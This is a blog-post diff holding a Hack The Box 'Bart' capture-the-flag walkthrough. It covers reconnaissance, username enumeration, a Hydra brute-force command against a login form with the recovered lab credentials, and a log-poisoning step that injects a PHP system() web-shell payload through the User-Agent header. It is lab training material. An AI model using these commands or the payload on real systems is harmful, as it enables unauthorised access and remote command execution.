@@ -1,0 +1,190 @@
+---
+layout: post
+title:  "Hack The Box Bart writeup (w/o Metasploit)"
+date:   2020-01-16 11:27:00 -0400
+featured_img: "/assets/bart/bart-10.10.10.81.png"
+categories: Bart HTB Windows
+---
+
+10.10.10.81 - Bart
+
+![Bart](/assets/bart/bart-10.10.10.81.png)
+
+Majority of the machines I've been working on are Windows machines. I was practicing a lot recently on Windows Priv Esc and Bart machine is a good example.
+
+So... Let's start
+
+As always we will start with nmap.
+
+`nmap -A 10.10.10.81`
+
+{% highlight shell %}
+nmap -A 10.10.10.81
+Starting Nmap 7.80 ( https://nmap.org ) at 2020-01-16 11:29 EST
+Nmap scan report for bart.htb (10.10.10.81)
+Host is up (0.044s latency).
+Not shown: 999 filtered ports
+PORT   STATE SERVICE VERSION
+80/tcp open  http    Microsoft IIS httpd 10.0
+| http-methods: 
+|_  Potentially risky methods: TRACE
+|_http-server-header: Microsoft-IIS/10.0
+|_http-title: Did not follow redirect to http://forum.bart.htb/
+Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
+Device type: general purpose
+Running (JUST GUESSING): FreeBSD 6.X (87%), Microsoft Windows 10|2008 (87%)
+OS CPE: cpe:/o:freebsd:freebsd:6.2 cpe:/o:microsoft:windows_10 cpe:/o:microsoft:windows_server_2008:r2
+Aggressive OS guesses: FreeBSD 6.2-RELEASE (87%), Microsoft Windows 10 (87%), Microsoft Windows Server 2008 R2 (85%)
+No exact OS matches for host (test conditions non-ideal).
+Network Distance: 2 hops
+Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
+
+TRACEROUTE (using port 80/tcp)
+HOP RTT      ADDRESS
+1   41.40 ms 10.10.14.1
+2   43.67 ms bart.htb (10.10.10.81)
+
+OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 27.43 seconds
+
+{% endhighlight %}
+
+![nmap](/assets/bart/nmap-10.10.10.81.png) 
+
+Port 80 is open. We have IIS version 10 which tells us that we have Windows 10 on 2016. We also get first url `http://forum.bart.htb`
+
+
+Let's try searching for other directories on the server with dirsearch:
+
+`root@kali:~/dirsearch# python3 dirsearch.py -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -e php -f -t 20 -u 10.10.10.81`
+
+![dirsearch](/assets/bart/dirsearch-10.10.10.81.png)
+
+Dirsearch found also `/monitor/` for us.
+
+We can add add  `10.10.10.81 bart.htb forum.bart.htb` to `/etc/hosts` file.
+
+
+Let start with `forum.bart.htb`
+
+![dirsearch](/assets/bart/forum-10.10.10.81.png)
+
+We can see several persons here.
+
+There is also one hidden inside page source
+
+![dirsearch](/assets/bart/forum-html-10.10.10.81.png)
+
+
+There is also /monitor page
+
+Let's go there
+
+![dirsearch](/assets/bart/monitor-10.10.10.81.png)
+
+
+We can try to guess passwords. `admin:admin` did not work. We have Forgot password here. This may help us guess users.
+
+Will try `user` first
+
+![dirsearch](/assets/bart/forgot1-10.10.10.81.png)
+
+`The provided username could not be found.`
+
+![dirsearch](/assets/bart/forgot2-10.10.10.81.png)
+
+But what about one of the persons we found on forum page.
+
+We can try `harvey`
+
+![dirsearch](/assets/bart/forgot3-10.10.10.81.png)
+
+Success
+
+![dirsearch](/assets/bart/forgot4-10.10.10.81.png)
+
+After some trial and error the passwords turns out to be `potter`
+
+So we are in.
+
+![dirsearch](/assets/bart/monitor2-10.10.10.81.png)
+
+But all we can see is the new subdomain `internal-01`
+
+![dirsearch](/assets/bart/monitor3-10.10.10.81.png)
+
+Let's add it to hosts file as well.
+
+Open it in browser
+
+![dirsearch](/assets/bart/internal-10.10.10.81.png)
+
+Assuming the user is harvey, let's brute force our way in.
+
+Hydra is the right tool for this
+
+`hydra -l harvey -P /usr/share/wordlists/metasploit/common_roots.txt internal-01.bart.htb  http-form-post "/simple_chat/login.php:uname=^USER^&passwd=^PASS^&submit=Login:Password"`
+
+`-l` is to specify user
+
+`-P` is pointing to our wordlist
+
+`http-form-post` is the type of form used on this website
+
+`/simple_chat/login.php` shows the page it is trying to login to
+
+`:Password` is the key word we see when login is not succcessdul. In our case it is either `Invalid Username or Password` or `The Password must be at least 8 characters` Since `Password` is seen in both cases we can specify just it
+
+![dirsearch](/assets/bart/internal-fail1-10.10.10.81.png)
+
+![dirsearch](/assets/bart/internal-fail2-10.10.10.81.png)
+
+
+Run Hydra
+
+![dirsearch](/assets/bart/hydra-10.10.10.81.png)
+
+We got password: Password1
+
+And so we are in
+
+![dirsearch](/assets/bart/internal-chat-10.10.10.81.png)
+
+According to chat harvey messed something up. Let's check page source.
+
+![dirsearch](/assets/bart/logging-10.10.10.81.png)
+
+This looks very interesting `http://internal-01.bart.htb/log/log.php?filename=log.txt&username=harvey`
+
+It seems to be storing logs into log.txt file.
+
+![dirsearch](/assets/bart/logging2-10.10.10.81.png)
+
+We can do log poisoning.
+
+For this we will need to use Burp Suite
+
+First switch browser to proxy through Burp
+
+![burp](/assets/bart/burp1-10.10.10.81.png)
+
+Start Burp and turn Intercept ON
+
+![dirsearch](/assets/bart/burp2-10.10.10.81.png)
+
+In browser open 
+
+`http://internal-01.bart.htb/log/log.php?filename=log.php&username=harvey`
+
+![burp](/assets/bart/burp3-10.10.10.81.png)
+
+Send request to repeater
+
+Edit User-Aget line like this `User-Agent: <?php system($_REQUEST['Argument']); ?>`
+
+![burp](/assets/bart/burp4-10.10.10.81.png)
+
+
+
+
+
